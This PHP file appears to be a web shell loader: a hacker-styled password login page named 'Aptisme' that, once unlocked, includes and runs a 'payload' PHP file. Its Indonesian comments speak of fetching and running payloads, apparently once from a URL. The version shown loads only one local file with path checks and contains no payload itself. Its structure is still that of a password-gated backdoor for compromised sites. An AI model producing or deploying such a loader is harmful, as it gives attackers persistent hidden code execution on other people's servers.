<?php
session_start();

// ---------------- PASSWORD ----------------
$secure_password_hash = '$2y$12$AulKg6bFQPJrHZ0/YSCPse2uXJ8gzPR.bwfuZ.Xms3nmNbR3AdtYi'; // password_hash("password", PASSWORD_BCRYPT)
$session_key = hash('sha256', $_SERVER['HTTP_HOST'] . '_aptisme_v3');

// ---------------- FORM LOGIN ----------------
function show_login_form($error = '') {
    $errhtml = $error ? "<div style='color:#ff6666;margin-top:10px;'>".htmlspecialchars($error)."</div>" : "";
    echo <<<HTML
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Aptisme Login</title>
<style>
body{background:#000;color:#0f0;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;}
.box{background:#111;padding:30px;border:2px solid #0f0;border-radius:10px;width:300px;}
input{width:100%;padding:10px;margin-top:10px;background:#000;color:#0f0;border:1px solid #0f0;}
input[type=submit]{background:#0f0;color:#000;font-weight:bold;cursor:pointer;}
input[type=submit]:hover{background:#00b300;}
</style>
</head>
<body>
<div class="box">
<form method="post">
<label>Password:</label>
<input type="password" name="password" required>
<input type="submit" value="Login">
</form>
{$errhtml}
</div>
</body>
</html>
HTML;
    exit;
}

// ---------------- CEK LOGIN ----------------
if (!isset($_SESSION[$session_key])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if (password_verify($_POST['password'], $secure_password_hash)) {
            $_SESSION[$session_key] = true;
        } else {
            // Logging percobaan login
            file_put_contents(__DIR__.'/login_attempts.log', date('Y-m-d H:i:s').' - FAILED login from '.$_SERVER['REMOTE_ADDR'].PHP_EOL, FILE_APPEND);
            show_login_form('Password salah!');
        }
    } else {
        show_login_form();
    }
}

// ---------------- FUNCTION BANTU ----------------
function safe_include($file) {
    $base_dir = __DIR__ . '/safe_payloads/'; // Hanya folder ini yang boleh
    $real_path = realpath($base_dir . basename($file));
    if ($real_path && str_starts_with($real_path, $base_dir)) {
        include $real_path;
    }
}

// ---------------- AMBIL & JALANKAN PAYLOAD ----------------
// Hanya ambil dari URL aman, bisa diganti jadi file lokal
$payload_file = 'example_payload.php';
safe_include($payload_file);
?>
